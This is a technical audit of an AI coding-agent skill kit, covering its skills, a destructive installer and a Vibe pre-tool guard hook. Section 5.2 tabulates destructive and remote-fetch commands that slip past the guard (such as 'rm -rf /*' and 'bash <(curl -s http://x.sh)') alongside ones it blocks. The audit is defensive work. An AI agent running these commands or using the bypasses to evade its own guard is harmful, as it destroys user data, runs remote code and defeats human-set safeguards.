# TOKENLESS-SKILLS — FULL TECHNICAL AUDIT

**Repository:** https://github.com/geroiloyola/tokenless-skills (audited from local clone, branch `main`, commits `bc3835f` → `34433e3`)
**Audit date:** 2026 (audit-only; no project files modified except this report)
**Method:** full static read of every file (14 skills, SKILL_MASTER.md, install.sh, extras/vibe/\*, extras/chatbot, README, LICENSE) + empirical tests in isolated sandbox environments (`$HOME` overridden to temp directories; no real user configuration touched) + live guard.py test matrix + web grounding for host claims.
**Token figures**: estimated with `chars ÷ 4` (markdown, CRLF preserved); labeled as estimates. A model-specific tokenizer was unavailable in the audit environment.

---

## 1. Executive summary

tokenless-skills is a genuinely well-conceived skill kit. The doctrine in `skills/SKILL_MASTER.md` is unusually disciplined, and all 14 skills comply with their own hard rules (≤50 non-empty body lines, `description` ≤250 chars, `name` = folder name). Empirically, skill bodies are 360–567 estimated tokens (mean ≈454) — the "~500 tokens per skill" claim is a fair estimate. The writing is dense, imperative, falsifiable, and escape-hatched; this is legitimately senior work.

However, the distribution layer is not ready for v1.0:

- **The README's primary installation method (`curl | bash`) does not work at all** — confirmed experimentally: bash reads the script from stdin, `BASH_SOURCE[0]` is unbound, and `set -u` aborts at line 9.
- **Confirmed silent data loss**: reinstalling over a customized skill destroys it without backup (`install.sh:104–107`); a latent bug escalates this to `rm -rf <dest>/*` — deletion of **every** skill in a host directory — whenever the skills glob does not match.
- **The security guard fails its own test suite**: 17 of ~21 adversarial inputs bypass it, including two confirmed destructive commands in canonical form (`chmod -R 777 /` is an unreachable dead rule due to a case bug), and it fails open on every malformed input.
- **Every quantitative marketing claim except "~500 tokens" is unsupported by any benchmark in the repo**, and there are **zero tests and zero CI** despite `SKILL_MASTER.md` mandating a validation protocol that references a script that does not exist.

**Biggest strengths:** doctrine quality; real token discipline; measured, falsifiable instructions; useful auxiliary scripts (verified working).
**Biggest weaknesses:** destructive installer, broken headline install path, guard effectiveness, no automated validation anywhere.
**Verdict: NOT READY** (see §12). The skill content is arguably beyond v1.0; the installer and guard are pre-alpha.

---

## 2. Architecture analysis

### 2.1 Architecture map

```
tokenless-skills/
├── README.md                       # positioning + install (1 command)
├── LICENSE                         # MIT
├── install.sh                      # single-script installer (bash, set -euo pipefail)
├── skills/
│   ├── SKILL_MASTER.md             # authoring doctrine (NOT installed by installer)
│   └── <14×>/SKILL.md              # workflow / gate / memory / tool-backed skills
│       ├── references/*.md         # on-demand digests (4 files)
│       └── scripts/*.mjs           # contrast.mjs (deps-free), webcheck.mjs (Playwright)
└── extras/
    ├── vibe/                       # Vibe adapter: guard.py, qa.py, hooks.toml,
    │                               #   agents/plan.toml, agents/reviewer.toml
    └── chatbot/SKILLS.txt          # concatenated export for chat UIs
```

**How skills are discovered.** Each skill is a folder with `SKILL.md` + YAML frontmatter (`name`, `description`, `license`, `metadata.version`) conforming to Agent Skills 1.0. Only the description is always-loaded (the index); the body loads on activation; `references/` and `scripts/` load on demand. This matches the spec's progressive disclosure model and is the kit's core token-economics mechanism.

**How skills are installed.** `install.sh` auto-detects hosts by checking for existing config roots under `$HOME`, or installs on demand via `--agent`/`--scope`. Per host it does `rmdir`-free `mkdir -p $dest` then, per skill, `rm -rf $dest/$name; cp -R`. User scope additionally seeds a managed rules block into per-host memory files and creates shared memory at `~/.agents/memory/{lessons,instincts}.md`. For the `vibe` host it also materializes `scripts/guard.py`, `scripts/qa.py`, `hooks.toml` (with `{{KIT_DIR}}` templated by sed), and two agent TOMLs.

**How agents consume them.** The host loads `description` (~51 tok mean, Σ≈716 tok for 14) into its skill index at startup; activation loads the body; memory files are read at session start via the seeded rules block.

**Global vs project scope.** User scope → `$HOME/<host>/skills` (skips hosts with no config dir); project scope → `$PWD/.<host>/skills` **for all 9 hosts unconditionally** (see finding A-3). Project `hooks.toml` wins over user per Vibe semantics.

**Mandatory vs optional.** Skills are self-contained; `guard.py`/`qa.py`/agent TOMLs are Vibe-only optional; `webcheck.mjs` degrades gracefully to exit-2 (manual testing); `contrast.mjs` has zero dependencies; `uiux.md` §8 references an optional upstream skill (`ui-ux-pro-max-cli`, npm global).

### 2.2 Dependency map

| Skill | Depends on | Independent? |
|---|---|---|
| repo-context | none (produces AGENTS.md that others consume) | ✅ |
| spec-brainstorm | output → write-plan (canonical order) | ✅ runnable alone |
| write-plan | spec path; output reused by subagent-execute (`touches:` tags) | ✅ runnable alone |
| implement-tdd | AGENTS.md commands; `references/tests.md`; systematic-debugging (escape) | ✅ |
| systematic-debugging | AGENTS.md/test commands | ✅ |
| verify-done | AGENTS.md gates; webapp-testing (optional smoke) | ✅ |
| remember-correction | `~/.agents/memory/lessons.md` (created by installer) | ⚠️ requires installer or manual creation |
| learn-instinct | `~/.agents/memory/instincts.md`; ECC compatible (fallback stated) | ⚠️ same |
| subagent-execute | write-plan output, implement-tdd, fresh-review, verify-done; git worktree | ❌ most coupled |
| fresh-review | reviewer via `reviewer.toml` (Vibe) or fresh session/spec | ⚠️ Vibe extras on other hosts |
| webapp-testing | Playwright, optional axe-core CDN; webapp dev server config | ✅ (exit 2 fallback) |
| security-review | references/owasp.md; grep/jq-equivalents | ✅ |
| design-review | references/uiux.md, contrast.mjs, webapp-testing | ✅ |
| eval-harness | prompts/eval/ tasks; `prompts/task-templates.md` (missing, marked optional) | ⚠️ broken ref |

**Findings:**
- No circular dependencies. The strictly ordered pipeline `spec-brainstorm → write-plan → implement-tdd → fresh-review → verify-done` is consistent and cross-referenced correctly.
- **Missing dependency:** `scripts/check_skills.py` — referenced 4× by SKILL_MASTER.md (hand-off prompt, validation protocol §7, budget note §9) but absent from the repo. The kit's own validation loop is unrunnable.
- **Missing dependency:** `prompts/task-templates.md` — referenced by eval-harness (labeled "optional", acceptable) and SKILL_MASTER.
- **Path inconsistency:** SKILL_MASTER §10 says `scripts/install.sh`; the file is `install.sh` at repo root.
- **Redundant responsibility trio:** remember-correction / learn-instinct / the installer-seeded AGENTS.md rules block all govern memory. The rules block instructs agents to read both memory files at session start; the two memory skills write them; the AGENTS.md block defines caps.划分 is coherent but three places must stay in sync manually.
- **Conflict:** `learn-instinct` says "never maintain both [ECC and this file] in parallel" but `remember-correction` says "ECC handles this… still write the line here" — deliberately asymmetric, arguably fine, but the two skills treat ECC divergence differently without explanation.
- **SKILL_MASTER internal count bug:** "in the same shape, size and doctrine as the **13** shipped ones" — the kit ships 14.
- Stale doc-drift channel: `extras/chatbot/SKILLS.txt` (30,741 bytes) duplicates every skill verbatim with **no mechanism/process to keep it in sync** (first line of its frontmatter render is already broken: `## design-review` followed by two bare `---` lines).

### 2.3 Architecture verdict

| Property | Verdict |
|---|---|
| Minimal | ✅ Excellent — ~99 KB total, one shell file, two small Python files, two node scripts |
| Modular | ✅ Each skill decoupled; references digests split correctly |
| Maintainable | ⚠️ Doctrine exists but no tooling enforces it (check_skills.py missing); SKILLS.txt is an unenforceable sync liability |
| Portable | ⚠️ Skills yes; memory block and guard are host-specific by design, and rules seeding covers 5 of 9 hosts |
| Extensible | ✅ SKILL_MASTER is a clear extension contract |
| Consistent | ✅ All 14 pass doctrine hard rules (verified programmatically) |

**Recommended changes (only where concrete benefit):** ship `scripts/check_skills.py` (~60 lines); delete or generate SKILLS.txt; nothing else structurally. The architecture should not grow.

---

## 3. Installer audit (`install.sh`)

### 3.1 Destructive operations analysis

| # | Operation | Line | Scenario | Severity |
|---|---|---|---|---|
| A | `rm -rf "${dest%/}/$name"` before `cp -R` | ~104–107 | User-local customization of a kit skill is silently destroyed on reinstall. **Confirmed** (test 4): a modified `verify-done/SKILL.md` + `personal-notes.md` vanished. | P0 data loss |
| B | Glob-no-match → `name="*"` → `rm -rf <dest>/*` | ~99–107 | When `$KIT/skills/*` matches nothing (partial checkout, renamed dir, future fix of the `BASH_SOURCE` bug re-enabling `curl \| bash` from an arbitrary cwd), the loop body executes `rm -rf` on every file in **each detected host's skills dir**. **Confirmed** the construct produces `rm -rf: /tmp/h5/.claude/skills/*` (test 5). | P0 latent destructive |
| C | `curl \| bash` (README's #1 install command) | :9 + README:9 | `BASH_SOURCE[0]: unbound variable` under `set -u` when script runs from stdin → **installer always aborts; skill never installed**. **Confirmed** (test: `bash < install.sh`). Correctness bug that hides bug B. | P0 |
| D | `sed … > "$VROOT/hooks.toml"` | ~116–118 | Overwrites any pre-existing user `hooks.toml` with no check and no backup → silent loss of user hooks. | P1 data loss |
| E | `eval ud="$user_dir"` / `eval pd=` / `eval parent_dir=` | ~41–51 | Values are static (internal table), so today not injectable — but `eval` on strings is a standing hazard; one future edit that puts user data into the table turns it into code execution. Also `--scope` is never validated: any value ≠ `user` silently behaves as `project`. | P2 design |
| F | `sed "s\|{{KIT_DIR}}\|$VROOT\|g"` | ~112–118 | A path containing `\|` or `&` corrupts the generated `guard.py`/`qa.py`/`hooks.toml` (sed replacement metacharacters). Install to e.g. `/mnt/a&b/` yields a broken hook with a wrong path. Edge case, silent. | P2 |
| G | `mkdir -p "$dest"` then per-skill rm+cp | ~99–108 | Interrupted install leaves a host with a partial (deleted-then-missing) set. No atomicity; rerun repairs. | P2 |
| H | Rules seeding for 5 of 9 hosts only | ~121–127 | Antigravity, Cursor, agents, opencat receive skills but no rules block ⇒ the memory workflow (lessons/instincts loaded "at session start") never loads on those hosts unless the user hand-writes it. Silent partial functionality. | P1 |
| I | Project scope installs to **all 9** host dirs | ~51–58 | `--scope project` in a clean dir creates 9 skill trees (incl. `.opencat/`, `.agents/`) — committing these is repo noise; also all copies must be updated together. | P2 design |
| J | No versioning, no ownership manifest | whole file | Cannot uninstall selectively (no manifest), cannot detect version, cannot preview changes. `rm -rf`-style uninstall of a third-party skill named like a kit skill is indistinguishable from kit-owned. | P1 design |
| K | Symlink destination | any | If `$dest/$name` is a symlink to elsewhere, `rm -rf` removes the link (not the target) — safe by accident. `cp -R` into a symlinked dest follows it — that is the user's chosen dest; acceptable. | ✅ no issue found |
| L | Permission denied on dest | mkdir/cp | `set -e` aborts mid-host-loop: earlier hosts fully installed, later skipped, exit non-zero — acceptable partial-failure semantics (idempotent rerun), but no nicer message. | P3 |

**Not done:** no backups, no rollback, no preview, no integrity verification, no SHA check, no manifest.

### 3.2 Installation safety tests — results (isolated `$HOME` sandboxes, never user dirs)

| Test | Result |
|---|---|
| 1 Fresh install, auto-detect | ✅ Pass — 14 skills × detected hosts, unrelated skills preserved |
| 2 Reinstall | ✅ Idempotent (same content) |
| 3 Upgrade from older version | ❌ Impossible to express: no version detection or manifest; overwrite-only |
| 4 Existing customized kit skill | ❌ **Silently destroyed** (test 4) |
| 5 Existing third-party skill, different name | ✅ Preserved |
| 5b Existing third-party/superpowers with kit name | ❌ Destroyed (same code path as 4) |
| 6 Interrupted install | ⚠️ Partial tree; rerun repairs; no atomicity |
| 7 Invalid destination | ⚠️ `mkdir -p` creates it blindly (e.g. typo'd `--agent`/`--scope` combos) |
| 8 Permission denied | ⚠️ Aborts with plain bash error; partial installs possible |
| 9 Symlink destination | ✅ Safe in tested form |
| 10 Project-only install | ✅ Works, but 9 host dirs (finding I) |
| 11 Global install | ✅ Works |
| 12 Multiple hosts simultaneously | ✅ Works (claude + codex in test 1) |
| 13 `curl \| bash` (README method) | ❌ **Aborts: `BASH_SOURCE[0]: unbound`** (finding C) |

### 3.3 Required design evaluation + minimal remediation (no package manager)

- **Non-destructive install:** replace `rm -rf X; cp -R` with `rsync -a --delete` scoped to the skill dir only, guarded by a `[[ -d $KIT/skills ]]` check, or: verify `cp -R "$d" "$tmpdest" && rm -rf "$dest/$name" && mv "$tmpdest" "$dest/$name"` (copy-then-swap = near-atomic).
- **Backups + rollback:** on overwrite of an existing kit-named dir, `mv "$dest/$name" "$dest/.tsk-backup/<name>-$(date +%s)"` — 1 line, one directory, prunable on demand. No versioning system needed.
- **Manifest:** emit `$HOME/.agents/installed.json` (host → skill → version from frontmatter). 10 lines of Python or grep; enables safe uninstall and update previews.
- **Idempotency:** already achieved by just removing the `rm -rf` (cp over existing is fine when identical); content-diff check optional.
- **Safe uninstall:** read manifest, delete only listed paths. Rejects: settings AGENTS.md blocks remain (provide `--purge` removing managed block with awk range match).
- **Update previews:** `install.sh --dry-run` (echo only, no mkdir). ~5 lines.
- **Integrity verification:** for the git-clone path, unnecessary (git verifies). For curl|bash, prefer the documented method below.
- **Atomic installation:** install to `$dest/.tmp-<pid>` then rename per skill (rename is atomic on the same volume).
- **Fix the BASH_SOURCE bug:** `KIT="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" …)"` still fails for stdin; correct approach: make `curl|bash` a **git-clone-then-run** helper or accept a `--from` arg:
  ```bash
  TMPDIR_KIT=$(mktemp -d) && git clone --depth 1 https://github.com/<user>/tokenless-skills "$TMPDIR_KIT" && "$TMPDIR_KIT/install.sh" "$@" && rm -rf "$TMPDIR_KIT"
  ```
  This also gives you tag pinning (`--branch v1.0.0`) and integrity (git commit SHA) for free.
- **Glob guard:** `[ -d "$KIT/skills" ] || { echo "installer must be run from a tokenless-skills checkout"; exit 1; }` and `shopt -s nullglob` — eliminates finding B on 1 line.

### 3.4 Supply chain security

- **Remote script execution:** `curl | bash` downloads from `main` (branch) with **no pinning, no checksum**. Combined with GitHub's current compromise surface this is standard-but-weak; the fix above (clone a tag + verify SHA) is strictly better and still "one command".
- **README URL contains `{user}`** — a literal placeholder, meaning the curl instruction has never been able to point anywhere valid (README:9).
- **Dependency pinning:** no runtime package deps (good); webcheck.mjs pins axe-core 4.9.1 from cdnjs in-code (single pin, network-dependent; no SRI — a CDN compromise injects JS into the audited page; modest risk, worth an integrity attribute or vendoring).
- **CI permissions:** none exists — nothing to over-permission (see §8).
- **Threat model (realistic):** (1) typo-squatting or repo takeover makes `curl|bash` the classic code-execution vector — mitigated only by fixing C and pinning; (2) a compromised kit upload installs a malicious skill into every host — no integrity story exists (manifest with SHA256 + verify on update would close this); (3) guard.py installed as a hook is itself attack surface: it runs on every tool call with the payload on stdin — payloads are JSON-parsed only, no eval — ✅ no injection found in guard.py/qa.py.

---

## 4. Complete skill-by-skill audit

Token figures = `(chars−frontmatter) ÷ 4`, labeled **estimate**. Quality scores are **static inspection only** (no live agent execution performed in this audit; that limitation is stated, not papered over).

### 4.1 Findings per skill

**repo-context** — Purpose: build verified AGENTS.md. Quality high (verify-before-write rule is the standout). Weaknesses: `asdf current <lang>` requires a literal language substitution the skill doesn't say to make; "3–5 representative files per layer" + "2–3 levels of tree" is verbose-first- rather than token-first (ironic for a tokenless kit) though bounded. Update-mode diff/apply table is under-specified ("apply only what the user approves" — approval format undefined → agent may re-ask repeatedly). No escape hatch if repo is unbuildable/huge (monorepo >120 lines edge). Score matrix below. **Edge case unhandled:** read-only user with no command execution → step 3 ("verify every command") is impossible; no fallback stated.

**spec-brainstorm** — Good: operational criteria ("The system shall"), question budget, assumed-vs-confirmed rule. Weaknesses: hard-coded `ask_user_question` tool name (Vibe/Claude-specific; Codex/OpenCode lack it — no fallback named, contradicting the kit's own portability doctrine); `specs/<slug>.md` location rule ("respect the repo's docs folder") mildly ambiguous. Escape: trivial-request path exists ✅.

**write-plan** — Strong: vertical slicing, `touches:` contract consumed by subagent-execute (real dependency wiring), self-check list. Weaknesses: "10–30 agent minutes" and "≤3 files (5 = split)" — step 4 contains a numeric contradiction ("≤3 files … More than 5 files means split": what about 4–5?); no instruction for conflict when plan tasks exceed, e.g., 20 (context weight of plan not addressed).

**implement-tdd** — The kit's flagship; minimal-code rule, no-weakening-tests rule, attempt definition and escape to systematic-debugging are exemplary. Weaknesses: step 5 run of "full suite of the package" + step 7 build/lint/typecheck can be expensive on big repos — no budget guard; "references/tests.md" pointer is the right pattern; no guidance for non-test-driven repos where there is no test infra at all (bootstrap path absent).

**systematic-debugging** — Hypothesis format and stop-signs are the best parts. Weaknesses: race-condition tooling list (go -race, TSan, jcstress, JS setImmediate) is niche-large for a 500-token budget — candidates for references/; step 3 "disable half the flow" is ambiguous for non-linear flows.

**verify-done** — Gates ordered cheapest-first, perf-gate honesty ("never invent numbers"), pre-existing-vs-caused distinction, spec table. Excellent. Weaknesses: gate 0 hangs the optional perf harness off "AGENTS.md records a baseline" — a coupling that requires repo-context to have run; `git stash` as pre-existing-failure probe is destructive-adjacent (stash of untracked? not specified) — minor.

**remember-correction** — Line format, caps (80), dedupe-first, do-not-record. Very good. Weakness: relies on the installer-seeded AGENTS.md block (one line: "read lessons.md") — on hosts without the block (see 3.1-H) this skill writes to a file nothing reads. **Edge:** concurrent sessions appending — no lock; acceptable risk, not worth complexity.

**learn-instinct** — Confidence lifecycle (0.5 base, ±0.1/−0.2, prune ≤0.2, promote ≥0.7 with 2-session evidence, ask before promoting). Very good. Weakness: arithmetic bookkeeping by LLM is error-prone; no instruction on where current confidence values live when editing a line (grep-and-bump). ECC-difference instruction is contradictory with remember-correction (§2.2).

**subagent-execute** — Most complex skill and it holds up: worktree isolation, touches-based parallelism, BLOCKED protocol, green-gate merges, no-push-without-approval. Weaknesses: `../wt-<task-id>` outside the repo — hosts that sandbox cwd (web sandboxes acknowledged) or Windows dir-permission setups may fail; step 5 "rebase the task branch first" conflicts subtly with rule "one branch at a time" merge order (minor); no cap on concurrent worktrees (disk/approval pressure).

**fresh-review** — Freezing diff to `.agents/tmp/review.diff`, read-only reviewer with explicit brief, mandatory re-run loop, output format. Very good. Weaknesses: reviewer brief pastes `references/reviewer.md` by pointer, but the delegation instruction says "Reply in the output format of this skill's references/reviewer.md" — the subagent must be *given* that file or a path to it; not stated → subagent may lack it on other hosts. No timeout/size guard beyond the >400-line two-pass note.

**webapp-testing** — Order-of-preference ladder (MCP → script → manual, explicit honesty in ladder rung 3) is exactly right. Weaknesses (scripts): `webcheck.mjs` counts **any** console warning/failed request as a defect → false-positive heavy (e.g., analytics blocked, favicon 404); `--wait 800` fixed wait contradicts nothing but is dead-ish vs networkidle; axe from CDN (§3.4). Skill text says "console errors, HTTP ≥400, a11y (axe-core), missing accessible names, images without alt, horizontal overflow at 375px" ✅ matches script contract (verified by reading the script); exit 2 fallback documented in script but not echoed in the skill body — add one line.

**security-review** — The grep heuristics + "a finding without an exploit path is a MINOR" honesty rule + do-not-paste-secrets rule. Good. Weaknesses: step 2 secrets regex greps **working tree files**, not the diff — it can report secrets that were never added by this change (false positives) and miss secret candidates the eye catches ("client_secret", "-----BEGIN" covered, `Bearer ey…` not); `references/owasp.md` quality is uneven (A08's "Verify signatures, hashes" is filler).

**design-review** — Directive pairing (must/never), token-before-components, contrast.mjs verified working. Weaknesses: **the skill's own contrast rule is not self-enforced by the script**: `contrast.mjs` rejects 3-digit hex (`#fff` → NaN) and produces crashes on malformed input rather than the documented JJSON-on-error path; the 1–10 scoring rubric ("hierarchy, spacing rhythm…") defines no anchor points → non-reproducible scores; the "2 minutes" framing is a gesture.

**eval-harness** — The right idea (the kit's own self-test) and escape clause. Weaknesses: it depends on `prompts/eval/` per-repo setup and onto headless CLI flags (`vibe --prompt`, `claude -p`, `codex exec`, `opencode run`, `gemini -p`) — flags drift fast, no link; "tokens" as a per-session metric is not uniformly exposed by all listed CLIs → metric may be unmeasurable on some hosts; references `prompts/task-templates.md` which is missing.

### 4.2 Token efficiency (estimates, chars/4)

| Skill | Body tok (est) | Desc tok (est) | Non-empty lines | Within master budget (≤1000) |
|---|---:|---:|---:|:--|
| repo-context | 472 | 48 | 37 | ✅ |
| spec-brainstorm | 451 | 55 | 32 | ✅ |
| write-plan | 428 | 50 | 34 | ✅ |
| implement-tdd | 567 | 42 | 32 | ✅ |
| systematic-debugging | 449 | 47 | 19 | ✅ |
| verify-done | 452 | 44 | 33 | ✅ |
| remember-correction | 362 | 45 | 18 | ✅ |
| learn-instinct | 374 | 54 | 18 | ✅ |
| subagent-execute | 547 | 58 | 31 | ✅ |
| fresh-review | 467 | 50 | 21 | ✅ |
| webapp-testing | 399 | 53 | 20 | ✅ |
| security-review | 484 | 55 | 20 | ✅ |
| design-review | 554 | 54 | 31 | ✅ |
| eval-harness | 360 | 61 | 22 | ✅ |
| **Mean / total** | **454 / 6366** | **51 / 716** | | |

Always-loaded (descriptions only) ≈ **0.7k tokens**; worst case (all 14 bodies) ≈ **7.1k**. references digests: uiux.md ≈1.56k, owasp.md ≈0.39k, reviewer.md ≈0.38k, tests.md ≈0.16k (load on demand). SKILL_MASTER.md itself ≈2.5k tokens (author-time only — correctly not installed).

**Compression candidates** (without behavior loss): systematic-debugging's race-condition tool block (move to refs/); design-review's "Before coding" §3 repetition with uiux.md §4 (the skill restates the digest, ~60 tokens); security-review's parenthetical micro-explanations of flags; implement-tdd step 5's monorepo command examples (covered conceptually by repro-context/AGENTS.md). Estimated recoverable: ~120–200 tokens (~3%) — **not worth aggressive surgery**; the kit's budget-vs-capability balance is already good.

### 4.3 Quality matrix (static scores; 1–10, no empirical weighting)

| Skill | Tokens (est) | Quality | Redundancy | Reliability | Main weakness | Priority |
|---|---:|---:|---:|---:|---|---|
| implement-tdd | 567 | 9 | 8* | 8 | no greenfield (no-test-infra) path | P3 |
| verify-done | 452 | 9 | 9* | 8 | AGENTS.md-baseline coupling (gate 0) | P3 |
| systematic-debugging | 449 | 8 | 6* | 7 | race-tool list over-budget for body | P3 |
| subagent-execute | 547 | 8 | 8* | 7 | worktree assumptions on sandboxed hosts | P2 |
| fresh-review | 467 | 8 | 7* | 7 | reviewer brief must ship reviewer.md path | P2 |
| security-review | 484 | 7 | 7* | 7 | greps tree not diff; secret-regex gaps | P2 |
| spec-brainstorm | 451 | 8 | 8* | 7 | ask_user_question hard-coded (Codex/OpenCode) | P1 |
| write-plan | 428 | 8 | 8* | 8 | 3-vs-5 file contradiction | P3 |
| webapp-testing | 399 | 8 | 8* | 6 | webcheck false-positive noise; CDN axe | P1 |
| design-review | 554 | 7 | 6* | 5 | unanchored 1–10 scores; contrast.mjs gaps | P2 |
| repo-context | 472 | 8 | 8* | 7 | update-approval flow under-specified | P3 |
| remember-correction | 362 | 8 | 8* | 7 | file unread on 4 of 9 hosts (installer H) | P1 |
| learn-instinct | 374 | 8 | 7* | 7 | LLM arithmetic bookkeeping; ECC asymmetry | P2 |
| eval-harness | 360 | 7 | 7* | 6 | missing templates; host flag drift; token metric | P2 |

\* redundancy = presence/absence of instruction redundancy (10 = none found).

### 4.4 Per-skill test scenarios (designed; + judgment on coverage)

For each skill, four canonical scenarios were designed and the SKILL.md evaluated for sufficiency:

- **implement-tdd**: normal (add endpoint) ✅ · edge (no test runner in repo) ❌ unguided · failure (test red after 2 attempts) ✅ escape defined · adversarial ("it works, skip the test") ✅ rule 1 blocks.
- **fresh-review**: normal (approve) ✅ · edge (diff >400 lines) ✅ · failure (reviewer unavailable) ✅ new-session fallback · adversarial (author grades own review) ✅ rule blocks.
- **subagent-execute**: normal (parallel disjoint tasks) ✅ · edge (touches overlap) ✅ · failure (BLOCKED subagent) ✅ · adversarial (main agent starts editing) ✅ rule.
- **systematic-debugging**: normal (repro→fix) ✅ · edge (flaky) ✅ · failure (3+ attempts) ✅ stop signs · adversarial (swallow exceptions to go green) ✅ named in stop-signs.
- **verify-done**: normal ✅ · edge (pre-existing red) ✅ · failure/perf (no baseline) ✅ · adversarial ("should work") ✅ explicit.
- **webapp-testing**: normal ✅ · edge (no Playwright) ✅ exit 2 · failure (server won't start) ⚠️ poll-until-ready, no timeout budget · adversarial (fix in check not code) ✅ rule 6.
- **security-review**: normal ✅ · edge (no trust boundary) ✅ · failure (audit tool absent) ✅ "only if configured" · adversarial (sanitize at call site) ✅ boundary rule.
- **design-review**: normal ✅ · edge (no design system in repo) ⚠️ token derivation ✅ but nothing about brand constraints · failure (contrast tool missing) ✅ NOT AUDITED label · adversarial (purple-gradient default) ✅ named.
- **repo-context**: normal ✅ · edge (monorepo) ✅ · failure (cannot run commands) ❌ · adversarial (copying README instead of verifying) ✅ rule 3.
- **spec-brainstorm**: normal ✅ · edge (trivial change) ✅ · failure (user silent/"whatever") ✅ · adversarial (assumption labeled as fact) ✅ rule 4.
- **write-plan**: normal ✅ · edge (tiny change) ✅ selfcheck · failure (unknown file names) ✅ "write the pattern and say so" · adversarial (over-abstraction) ✅ YAGNI.
- **remember-correction / learn-instinct**: change-echo (user says "don't do X") ✅ · edge (duplicate rule) ✅ · failure (file unwritable) ❌ unhandled · adversarial (vague lesson) ✅.
- **eval-harness**: normal ✅ · edge (baseline fail) ✅ skip rows · failure (flipping verdicts) ✅ escape · adversarial (tune eval to pass) ✅ rule 3.

Result: 2 real instruction gaps (fresh-review reviewer file path; repo-context/run-less environments; webapp-testing server-start timeout), rest adequately covered for the size budget.

---

## 5. Security assessment (guard.py + hooks)

### 5.1 Guard design

`extras/vibe/guard.py` (116 lines): a Vibe `pre_tool` hook. Mode `bash` regex-scans the lowercased command against 15 `DANGEROUS` patterns; mode `protect` regex-scans a normalized (backslash→slash) path against 4 `PROTECTED_PATHS` groups. Vibe contract: exit 0 + `{"decision":"deny"}` blocks; anything else passes. `hooks.toml` sets `strict = false` → all hook errors pass through (fail-open by design).

### 5.2 Confirmed bypasses (executed against guard.py in this audit)

| Command / path | Guard verdict | Why it fails |
|---|---|---|
| `rm -rf /*` | **ALLOW** | pattern requires `/` then `\s\|$`; glob `*` after `/` |
| `rm -rf "$HOME"` | **ALLOW** | quotes break the `~\|\$HOME` alternative |
| `rm -rf $(echo /)` | **ALLOW** | command substitution invisible to regex |
| `cd / && rm -rf *` | **ALLOW** | no anchored-root check; serialization not parsed |
| `find / -delete` | **ALLOW** | no coverage at all |
| `mv / ~/trash` | **ALLOW** | no coverage |
| `curl http://x \| zsh` | **ALLOW** | `bash\|sh` doesn't match `zsh`; also `python` pipes |
| `bash <(curl -s http://x.sh)` | **ALLOW** | process substitution unseen |
| `eval "$(wget -qO- http://x.sh)"` | **ALLOW** | substitution + eval |
| `git push origin +main` | **ALLOW** | force-via-branch-prefix not covered |
| `chmod -R 777 /` | **ALLOW** | **dead rule**: input is lowercased (`guard.py:105`), pattern literal `-R` uppercase (`guard.py:18`) — can never match |
| `chmod 777 -R /` | **ALLOW** | flag-order variant (also dead rule) |
| `python -c 'os.remove(...)'` | **ALLOW** | out of scope of regex (theoretical: any interpreter) |
| write to `.ENV` (Windows case) | **ALLOW** | protect patterns are case-sensitive; no `re.I` |
| write to `keys/ID_RSA` | **ALLOW** | same |
| write to `secrets.env` / `my.env` | **ALLOW** | pattern requires `(^\|/)\.env` leading dot |
| any input with non-string `command`, wrong keys, malformed JSON | **ALLOW (rc 0, silent)** | fail-open everywhere incl. parse failure (`guard.py:94–97`) |

**Correctly denied (verified):** `rm -rf /`, `rm -rf ~`, `rm -rf .git`, `git push --force X`, `git reset --hard origin…`, `git clean -xdf`, `git checkout -- .`, `dd if=… of=/dev/…`, `mkfs`, fork bomb (universal pattern), `curl…|bash`, `npm publish`/`twine upload`/`cargo publish`, `DROP TABLE/DATABASE`, `truncate table`, `> /dev/sdX`; protect: `.env*`, `.git/` (POSIX + backslash forms via normalization), all listed lockfiles, `id_rsa`/`id_ed25519`/`.netrc`/`.npmrc`/`.pypirc`, traversal `sub/../.env`. Positive-control false-positive probes: `src/dotenv.ts`, `.git-backup/config`, commit message containing "push --force" — all correctly allowed.

**Theoretical (not matched by design):** unicode-homoglyph command names, IFS-mangling, `bash -c` nesting, alias/abuse of host-allowed `script` key, symlinked-destination writes (protect mode resolves nothing — writing to a symlink that points to `.env` passes), env-var expansion `$P/^H` tricks.

### 5.3 Fail-open behavior

Confirmed: malformed JSON → allow (stderr warning), missing/empty fields → allow, unexpected types → allow, and `hooks.toml` `strict=false` compounds this. The deny reason text is French while the rest of hooks.toml mixes French/English — cosmetic inconsistency.

**Assessment:** fail-open is defensible for *deniability/annoyance* reasons, but **protect mode (secrets/credentials)** should not fail open: if the guard cannot parse its input, it cannot know the target file is safe. Recommend a per-mode policy flag in hooks.toml (`strict`, or guard reading `GUARD_MODE=protect` → fail-closed default for protect, fail-open for bash) — implementable in ~10 lines, no new dependency.

**Positioning honesty:** the guard's own docstring says it is an "accident" guard, not a sandbox — README should carry that exact disclaimer so users don't assign it sandbox-level trust.

### 5.4 Proposed security test matrix (to ship as `tests/test_guard.py`, stdlib only)

| Class | Cases (all executable as unit tests) |
|---|---|
| Must deny | the 16 verified-denied commands + 6 protected-path writes (above) |
| Must allow | ~10 legit dev commands (`git push`, `rm -rf build/`, `chmod -R 755 src/`), benign probe files (`src/dotenv.ts`, `.git-backup/`) |
| Bypass-ledger | every confirmed bypass from §5.2 — as documented-known-allow or expected-deny after fixes, so regressions are visible |
| Robustness | malformed JSON/empty/missing-fields/type-wrong inputs: assert policy (fail-open bash, fail-closed protect) |
| Unicode/encoding | homoglyph + uppercase-case canonical forms |
| Case | `.ENV`, `ID_RSA`, `Chmod -R 777 /` |
| False-positive | benign strings containing pattern substrings (commit msg, docs paths) |

---

## 6. Token economics and performance benchmark

### 6.1 What the repo claims

| Claim (README:3) | Verdict |
|---|---|
| "14 ultra-light agent skills (~500 tokens each)" | **Partially supported.** Empirical estimate: mean 454 (360–567) body tokens; 13/14 within ±25% of 500; method = chars/4, so within tokenizer noise. Defensible wording: "~350–600 tokens each, ~450 average". |
| "90% of the process value of ECC or Superpowers" | **Unsupported.** No capability-retention methodology exists in the repo; "process value" is not defined; no comparative run documented. |
| "~5% of the token cost" | **Unsupported / potentially misleading.** Partly arithmetic-plausible: ECC-style kits' always-loaded context can be ~15–25k tokens, vs ~0.7k here → ~3–5% of *always-loaded* cost. But the README doesn't scope the claim, and *total* cost depends on reference-digest loads and post-skill dialogue, on which no data exists. |

### 6.2 Static cost accounting (measured here)

- Always-loaded (14 descriptions + host overhead): **≈0.7k tokens**.
- Worst case all-bodies load: **≈7.1k** (est); typical single workflow: 1 body ≈0.4–0.6k + references ≈0.2–1.6k when digested.
